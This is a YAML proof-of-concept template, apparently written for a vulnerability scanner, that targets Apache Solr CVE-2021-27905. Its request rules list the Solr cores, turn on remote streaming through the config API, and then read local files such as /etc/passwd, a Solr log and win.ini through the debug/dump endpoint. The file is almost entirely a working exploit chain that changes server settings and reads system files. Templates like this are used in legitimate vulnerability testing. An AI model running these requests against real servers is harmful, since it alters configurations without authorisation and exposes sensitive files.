name: yaml-poc-apache-solr-ssrf-CVE-2021-27905
binding: b46f1664-440e-479f-a0e0-ac7ae3d1110e
detail:
    author: lianjian.chen
    links:
        - https://help.aliyun.com/noticelist/articleid/1060828539.html
        - https://lists.apache.org/thread.html/r0ddc3a82bd7523b1453cb7a5e09eb5559517145425074a42eb326b10%40%3Cannounce.apache.org%3E
        - https://lists.apache.org/thread.html/r140128dc6bb4f4e0b6a39e962c7ca25a8cbc8e48ed766176c931fccc%40%3Cusers.solr.apache.org%3E
        - https://lists.apache.org/thread.html/r140128dc6bb4f4e0b6a39e962c7ca25a8cbc8e48ed766176c931fccc@%3Cusers.solr.apache.org%3E
        - https://lists.apache.org/thread.html/r3da74965aba2b5f5744b7289ad447306eeb2940c872801819faa9314%40%3Cusers.solr.apache.org%3E
        - https://lists.apache.org/thread.html/r3da74965aba2b5f5744b7289ad447306eeb2940c872801819faa9314@%3Cusers.solr.apache.org%3E
        - https://lists.apache.org/thread.html/r6ccec7fc54d82591b23c143f1f6a6e38f6e03e75db70870e4cb14a1a%40%3Ccommits.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/r6ccec7fc54d82591b23c143f1f6a6e38f6e03e75db70870e4cb14a1a@%3Ccommits.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/r720a4a0497fc90bad5feec8aa18b777912ee15c7eeb5f882adbf523e%40%3Ccommits.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/r720a4a0497fc90bad5feec8aa18b777912ee15c7eeb5f882adbf523e@%3Ccommits.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/r78a3a4f1138a1608b0c6d4a2ee7647848c1a20b0d5c652cd9b02c25a%40%3Ccommits.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/r78a3a4f1138a1608b0c6d4a2ee7647848c1a20b0d5c652cd9b02c25a@%3Ccommits.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/r8f1152a43c36d878bbeb5a92f261e9efaf3af313b033d7acfccea59d%40%3Cnotifications.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/r8f1152a43c36d878bbeb5a92f261e9efaf3af313b033d7acfccea59d@%3Cnotifications.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/r95df34bb158375948da82b4dfe9a1b5d528572d586584162f8f5aeef%40%3Cusers.solr.apache.org%3E
        - https://lists.apache.org/thread.html/r95df34bb158375948da82b4dfe9a1b5d528572d586584162f8f5aeef@%3Cusers.solr.apache.org%3E
        - https://lists.apache.org/thread.html/rae9ccaecce9859f709ed1458545d90a4c07163070dc98b5e9e59057f%40%3Cnotifications.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/rae9ccaecce9859f709ed1458545d90a4c07163070dc98b5e9e59057f@%3Cnotifications.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/rd232d77c57a8ce172359ab098df9512d8b37373ab87c444be911b430%40%3Cnotifications.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/rd232d77c57a8ce172359ab098df9512d8b37373ab87c444be911b430@%3Cnotifications.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/re9d64bb8e5dfefddcbf255adb4559e13a0df5b818da1b9b51329723f%40%3Cnotifications.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/re9d64bb8e5dfefddcbf255adb4559e13a0df5b818da1b9b51329723f@%3Cnotifications.ofbiz.apache.org%3E
        - https://nvd.nist.gov/vuln/detail/CVE-2021-27905
        - https://security.netapp.com/advisory/ntap-20210611-0009/
        - https://www.auscert.org.au/bulletins/ESB-2021.1217
        - https://www.cybersecurity-help.cz/vdb/SB2021041303
        - https://www.ibm.com/blogs/psirt/security-bulletin-ibm-infosphere-information-server-is-affected-by-multiple-vulnerabilities-in-apache-solr/
        - https://www.mail-archive.com/announce@apache.org/msg06482.html
    vulnerability:
        id: ad768522-6273-4ab2-9e28-d5723890e3ed
        level: high
    warning: Harmless
transport: http
rules:
    linux0:
        request:
            cache: true
            method: GET
            path: /solr/admin/cores?indexInfo=false&wt=json
        expression: response.status == 200 && response.body.bcontains(b"responseHeader")
        output:
            search: '"\"name\":\"(?P<core>.+?)\"".bsubmatch(response.body)'
            core: search["core"]
    linux1:
        request:
            cache: true
            method: POST
            path: /solr/{{core}}/config
            headers:
                Content-Type: application/json
            body: |
                {"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
        expression: response.body.bcontains(b"responseHeader")
    linux2:
        request:
            cache: true
            method: POST
            path: /solr/{{core}}/debug/dump?param=ContentStreams
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                stream.url=file:///etc/passwd
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    linux3:
        request:
            cache: true
            method: POST
            path: /solr/{{core}}/debug/dump?param=ContentStreams
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                stream.url=file:///var/solr/logs/solr_gc.log
        expression: response.status == 200 && response.body_string.contains("org.apache.solr.handler.DumpRequestHandler") && response.body_string.contains('"stream"')
    windows0:
        request:
            cache: true
            method: GET
            path: /solr/admin/cores?indexInfo=false&wt=json
        expression: "true"
        output:
            search: '"\"name\":\"(?P<core>.+?)\"".bsubmatch(response.body)'
            core: search["core"]
    windows1:
        request:
            cache: true
            method: POST
            path: /solr/{{core}}/config
            headers:
                Content-Type: application/json
            body: |
                {"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
        expression: response.body.bcontains(b"responseHeader")
    windows2:
        request:
            cache: true
            method: POST
            path: /solr/{{core}}/debug/dump?param=ContentStreams
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                stream.url=file:///c://windows/win.ini
        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
expression: linux0() && linux1() && (linux2() || linux3()) || windows0() && windows1() && windows2()
